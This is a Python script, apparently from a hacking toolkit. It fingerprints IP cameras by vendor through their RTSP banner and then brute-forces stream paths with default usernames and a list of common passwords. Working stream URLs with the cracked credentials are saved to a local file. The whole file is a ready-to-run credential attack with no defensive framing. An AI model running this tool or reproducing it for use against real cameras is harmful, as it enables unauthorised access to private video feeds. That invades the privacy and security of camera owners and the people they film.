#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
from tqdm import tqdm
import socket
import re
import base64
import os

class CamLib():

    def Hikvision(self):
        paths = [
            'Streaming/Channels/101', 
            'Streaming/Channels/102',  
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['admin', 'root', 'supervisor']
        return (users, paths)

    def Dahua(self):
        paths = [
            'cam/realmonitor?channel=1&subtype=0',   
            'cam/realmonitor?channel=1&subtype=1',   
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['root', 'system']
        return (users, paths)

    def Uniview(self):
        paths = [
            'ucast/1/1',
            'stream1',
            'live.sdp',
            'videoMain',
            'media/video1',
            'media/video2',
        ]
        users = ['admin']
        return (users, paths)

    def Axis(self):
        paths = [
            'axis-media/media.amp',
            'axis-cgi/mjpg/video.cgi',
            'axis-cgi/media.cgi',
            'live.sdp',
        ]
        users = ['root', 'admin']
        return (users, paths)

    def Sony(self):
        paths = [
            'SNC/media/media.amp',
            'live.sdp',
            'videoMain',
        ]
        users = ['admin']
        return (users, paths)

    def Vivotek(self):
        paths = [
            'live.sdp',
            'live',
            'videoMain',
            'videoSub',
        ]
        users = ['admin']
        return (users, paths)

    def TVT(self):
        paths = [
    'cam/realmonitor?channel=1&subtype=0',
    'live.sdp',
    'videoMain',
    'media/video1',
    'media/video2',
    'stream1',
    'stream2',
    'h264',
    'h265',
    'videoSub',
    'ch0_0.h264',
    'ch1_0.h264',
    'user=admin_password=123456_channel=1_stream=0.sdp',
    'live/ch00_0',
    '0',
    '1',
    '11',
    '12',
    'h264Preview_01_main',
    'h264Preview_01_sub',
    ]
        users = ['admin']
        return (users, paths)

    def Reolink(self):
        paths = [
            'h264Preview_01_main',
            'h264Preview_01_sub',
            'live.sdp',
        ]
        users = ['admin']
        return (users, paths)

    def Milesight(self):
        paths = [
            'Streaming/Channels/101',
            'Streaming/Channels/102',
            'live.sdp',
            'videoMain',
            'media/video1',
        ]
        users = ['admin']
        return (users, paths)

class Execute_Cam(CamLib):
    def __init__(self):
        self.__PASSWORD = [
        '123456',
        'admin',
        'password',
        '12345',
        '1234',
        '12345678',
        '123456789',
        '111111',
        '123123',
        '1234567',
        'qwerty',
        'abc123',
        'password1',
        'root',
        'admin123',
        'admin1234',
        '123321',
        '888888',
        'adminadmin',
        '123',
        'user',
        '123qwe',
        'pass',
        '123abc',
        'admin1',
        'pass123',
        '123abc123',
        '1234qwer',
        'default',
        'guest',
        '123456a',
        '123abc!',
        '11111111',
    ]

    def run(self, ip: str, port=554):
        print(f"[+] Testing target: {ip}:{port}")
        _, banner = self.__get_rtsp_banner(ip, port)
        if banner is None:
            print("[...] Skip")
            return
        else:
            default_paths = [
                'live.sdp',
                'stream1',
                'stream2',
                'h264',
                'h265',
                'videoMain',
                'videoSub',
                'media/video1',
                'media/video2',
                'ch0_0.h264',
                'ch1_0.h264',
                'user=admin_password=123456_channel=1_stream=0.sdp',
                'live/ch00_0',
                '0',
                '1',
                '11',
                '12',
                'h264Preview_01_main',
                'h264Preview_01_sub',
            ]
            users = ['admin']
            banner_lower = banner.lower()
            if 'hikvision' in banner_lower:
                print("[+] Hikvision detected")
                users, default_paths = self.Hikvision()
            elif 'dahua' in banner_lower:
                print("[+] Dahua detected")
                users, default_paths = self.Dahua()
            elif 'uniview' in banner_lower:
                print("[+] Uniview detected")
                users, default_paths = self.Uniview()
            elif 'axis' in banner_lower:
                print("[+] Axis detected")
                users, default_paths = self.Axis()
            elif 'sony' in banner_lower:
                print("[+] Sony detected")
                users, default_paths = self.Sony()
            elif 'vivotek' in banner_lower:
                print("[+] Vivotek detected")
                users, default_paths = self.Vivotek()
            elif 'reolink' in banner_lower:
                print("[+] Reolink detected")
                users, default_paths = self.Reolink()
            elif 'tvt' in banner_lower:
                print("[+] TVT detected")
                users, default_paths = self.TVT()
            elif 'milesight' in banner_lower:
                print("[+] Milesight detected")
                users, default_paths = self.Milesight()
            else:
                print("[+] Unknown or clone device detected")
            self.__rtsp_path_bruteforce(ip, port, default_paths, users)


    def __get_rtsp_banner(self, ip: str, port=554):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            request = (
                f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                "CSeq: 1\r\n"
                "\r\n"
            )
            sock.send(request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            sock.close()
            print("[*] Authentication required detected, preparing to brute-force.")
            match = re.search(r"Server:\s*(.+)", response)
            if match:
                server = match.group(1).strip()
            else:
                server = 'N/A'
            return (ip, server)
        
        except Exception as e:
            return (None, None)


    def __rtsp_path_bruteforce(self, ip, port, paths, usernames):
        combos = [
            (username, password, path)
            for username in usernames
            for password in self.__PASSWORD
            for path in paths
        ]

        for username, password, path in tqdm(combos, desc="Progress", unit="combo"):
            auth_str = f"{username}:{password}"
            b64_auth = base64.b64encode(auth_str.encode()).decode()
            request = (
                f"DESCRIBE rtsp://{ip}:{port}/{path} RTSP/1.0\r\n"
                f"CSeq: 1\r\n"
                f"Authorization: Basic {b64_auth}\r\n"
                f"Accept: application/sdp\r\n"
                f"\r\n"
            )
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                sock.send(request.encode())
                response = sock.recv(4096).decode(errors='ignore')
                sock.close()
                if "200 OK" in response:
                    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/{path}"
                    print("[+] Successfully obtained RTSP URL")
                    print(f"[!] RTSP URL: {rtsp_url}")
                    os.makedirs('./data', exist_ok=True)
                    with open('./data/ipcam.info', 'a', encoding='utf-8') as f:
                        f.write(rtsp_url + '\n')
                    return

            except Exception:
                return